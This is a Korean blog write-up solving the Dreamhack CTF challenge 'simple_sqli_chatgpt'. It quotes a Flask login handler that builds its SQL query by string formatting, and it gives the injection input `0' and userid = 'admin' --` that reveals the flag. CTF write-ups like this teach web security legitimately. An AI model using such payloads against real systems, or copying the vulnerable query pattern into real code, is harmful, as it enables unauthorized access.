---
layout: post
title: Dreamhack | simple_sqli_chatgpt
subtitle: simple_sqli_chatgpt 문제 풀이
categories: Web
tags: [dreamhack, Pentest, Web]
---

**본 문제는 dreamhack.io를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/98561987-a6c7-41d7-86ea-d5857ac33fe3" width = 850>
</p>

로그인 서비스를 진행하는 페이지로 SQL Injection 공격을 이용하는 문제이다.

해당 문제를 서비스가 어떻게 이루어지는지에 대한 `app.py` 파일을 제공하고 있다.

### 문제 풀이

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/7462c0bd-158a-4a1a-bb95-13b562bd5128" width = 850>
</p>

서비스 접속 시 `userlevel`을 제외한 어떠한 입력 포인트도 존재하지 않다.

그렇다면 이 포인트를 이용한 SQLi를 진행하게 될 것으로 보이는데 제공해주는 `app.py` 파일을 확인해보도록 한다.

#### app.py

```python
DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100), userlevel integer);')
    db.execute(f'insert into users(userid, userpassword, userlevel) values ("guest", "guest", 0), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}", 0);')
    db.commit()
    db.close()

```

* 해당 데이터베이스에는 **guest**와 **admin**만 존재하고, admin의 password는 난수로 이루어져 있는 것을 확인할 수 있다.

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userlevel = request.form.get('userlevel')
        res = query_db(f"select * from users where userlevel='{userlevel}'")
        if res:
            userid = res[0]
            userlevel = res[2]
            print(userid, userlevel)
            if userid == 'admin' and userlevel == 0:
                return f'hello {userid} flag is {FLAG}' # <---- FLAG
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```

* 입력 포인트가 존재하는 `login`으로 FLAG를 확인하기 위해서는 `userid`와 `userlevel`이 0이어야 한다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/631f9b3d-227c-42d1-845e-20236e69da8f" width = 850>
</p>

입력포인트에 **0** 대입 시 **hello guest** alert가 발생하게 되는데 FLAG 분기를 확인해보면 `userid` 파라미터를 통한 **admin** 확인을 진행한다.

하지만 실제로 파라미터는 userlevel만 넘어가며 guest로만 확인이 된다.

SQL Injection이 발생하는지 확인하기 위해 싱글 쿼테이션 `'`을 대입하면 아래와 같은 에러가 발생한다.

```
Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```

해당 분기에서 userid까지 포함시키기 위한 SQL 조작을 진행하면 된다.

```sql
select * from users where userlevel='0' -- 기본
```

```sql
select * from users where userlevel='0' and userid = 'admin' -- 조작
```

* `0`만 넣는 것이 아닌 `0' and userid = 'admin' --` 대입을 통해 기존 SQL문법을 조작하여 FLAG를 확인할 수 있다.